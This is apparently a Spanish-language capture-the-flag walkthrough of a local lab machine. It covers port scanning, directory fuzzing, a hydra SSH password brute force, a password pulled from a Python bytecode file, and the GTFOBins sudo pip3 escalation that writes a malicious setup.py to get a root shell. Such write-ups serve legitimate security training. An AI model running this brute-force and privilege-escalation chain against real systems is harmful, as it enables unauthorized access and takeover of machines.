## FASE DE ENUMERACIÓN
Sabiendo que la IP de la máquina víctima es -->172.17.0.2 lanzamos un scan 
para ver que puertos tiene abiertos y que servicios corren en ello así como sus versiones:

```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:87:50:66:15:23:d6:c3:90:3f:ea:8c:a4:4b:b3:ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFyMxJnx/FVrs/dL7vbyNp+35y770eblZQQJ7veXIKbQFMQ4/QtOUyB+EoOrmRfLUqHYToQP9bzuQoZVdl9RxX7pCKLCW0LT1BKCJNdl0OO5GU0VkCGORpa283dYNyNVudyxSr+/AUieVkjo2Ux9v2v12pFbjwAunEKz7y1uJTuZIVml5Eoyw9Kvtzye7q8Zp2bEIwVZ+e0nfe2YXHMF5Ueb/hBmIJPDM0HzBgO5xEjuukN38G1lmKr6GoY3OYWAZf+Q7fEmR51kMria37iTBIZGPVIjPGoHRVWVS9xQkh4RoLZQ+B+lSc7w5E8+p63mnnP9bhZdFmi7ZU0E/K/zK89rH9hrqhKW/asdRxpw7nOhEanbtetWapkqpVS+IV54KRUq71iXsJPL+f0wHUe9oFOFKgSLy5q4xof3at1efU9vM6QSWlfRQJ2VV0pnZPsdIcGrnBqZZ5EeXMg1f0CIiLMAw2+RFc8VdiekMXw0Wp4FTZs3kTw6ybdI57NLiWGgs=
|   256 d1:35:c1:82:09:e8:c2:c7:cd:98:89:61:c2:6b:14:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM1F+Ch1Qbxelq+DL8N8aLWeQUbmJ7AfmICeWnlydXU3gqMgcQSZYEAIlftn/xtZGXRNtXSjmtsJd1X/5tM+wVs=
|   256 dd:01:45:ce:bd:a3:05:21:5b:31:4c:2f:df:38:c4:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFDhqHB8/I17FN+nt8N3uSSaBdvBu+rFCqlKWIeqYNmj
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 404 Not Found
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

-Puerto 22 SSH versión no vulnerable, sin user ni credenciales de momento lo dejamos
-Puerto 80 http que corre un Apache httpd 2.4.41 no vulnerable

Lanzamos un whatweb para ver si reporta algo interesante:
```bash
whatweb 172.17.0.2 -v | tee whatweb
```
```
Summary   : Apache[2.4.41], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]
```
 no viendo nada nuevo vamos a la página web, realizamos un fuzzing:
 ```bash
 gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/notes                (Status: 301) [Size: 308] [--> http://172.17.0.2/notes/]
/server-status        (Status: 403) [Size: 275]
Progress: 220546 / 220547 (100.00%)
===============================================================
Finished
===============================================================
```
vemos un directorio notes, vamos y vemos una nota--> http://172.17.0.2/notes/note.txt
```
Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.

-Admin
```
tenemos un user dev, al cual le han dicho que cambie la contraseña, probamos la vieja con ssh:
```bash
 ssh dev@172.17.0.2
```
y no nos deja, así pues intumos que la ha cambiado, vamos a realizar un ataque de fuerza bruta:
```bash
hydra -l dev -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
```
[22][ssh] host: 172.17.0.2   login: dev   password: computer
```
ahora tenemos user y contraseña: 
```
dev:computer
```
nos conectamos por ssh:
```bash
 ssh dev@172.17.0.2
```

## escalada de privilegios

comprobamos si estamos en algún grupo extraño:
```bash
id
```
nada extraño, ahora
miramos si tenemos algún privilegio sudo
```bash
sudo -l
```
```
[sudo] password for dev: 
Sorry, user dev may not run sudo on 10f3096dc630.
```
miramos la variable de entorno, he llegado a ver contraseñas aqui:
```bash
printenv
```
```
SHELL=/bin/bash
PWD=/home/dev
LOGNAME=dev
MOTD_SHOWN=pam
HOME=/home/dev
LANG=es_EC.UTF-8
SSH_CONNECTION=172.17.0.1 46334 172.17.0.2 22
TERM=xterm-256color
USER=dev
SHLVL=1
SSH_CLIENT=172.17.0.1 46334 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
SSH_TTY=/dev/pts/1
_=/usr/bin/printenv
```

nada, comprovamos privilegios SUID:
```bash
find / -perm -4000 2>/dev/null
```
```
/usr/bin/bash
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
llegados a este punto miramos los usuarios:
```bash
cat /etc/passwd | grep sh$
```
```
root:x:0:0:root:/root:/bin/bash
dev:x:1000:1000::/home/dev:/bin/bash
admin:x:1001:1001::/home/admin:/bin/bash
```
buscamos archivos del user admin que sean legibles para mi user:
```bash
find / -user admin 2>/dev/null
```
```
/home/admin
/home/admin/.bash_history
/home/admin/.profile
/home/admin/.bashrc
/home/admin/.bash_logout
/opt/scripts/__pycache__/secret.cpython-38.pyc
```
los del home no me reportan nada interesante, pero el script:
```bash
ls -la /opt/scripts/__pycache__/secret.cpython-38.pyc
```
```
-rw-r--r-- 1 admin admin 274 May 24 20:25 /opt/scripts/__pycache__/secret.cpython-38.pyc
```
```
cat /opt/scripts/__pycache__/secret.cpython-38.pyc
U
�2h`�@s
       dd�ZdS)cCsd}d}td�dS)NZadminz
                                   p@$$w0r8321zAuthenticating...)�print)usernamepassword�r�     secret.py�authsrN)rrrrr<module>
```
veo una contraseña para admin-->p@$$w0r8321

pruebo a hacereme user admin:
```bash
su admin
```
ya somos admin, comproamos si estamos en alún grupo extraño:
```bash
id
```
```
uid=1001(admin) gid=1001(admin) groups=1001(admin)
```
nada raro,
comprobamos si podemos ejecutar algo con privilegio sudo:
```bash
sudo -l
```
```
Matching Defaults entries for admin on 10f3096dc630:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on 10f3096dc630:
    (ALL) NOPASSWD: /usr/bin/pip3 install *
```

consulto el binario en:
```bash
https://gtfobins.github.io/gtfobins/pip/#sudo
```
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

vamos paso a paso:
```bash
#creamos una carpeta temporal
TF=$(mktemp -d)
#creamos el script malicioso
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
#ejecutamos con privilegios
sudo -u root /usr/bin/pip3 install $TF
```
```
Processing /tmp/tmp.tYV1nq9AK8
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
ya somos root
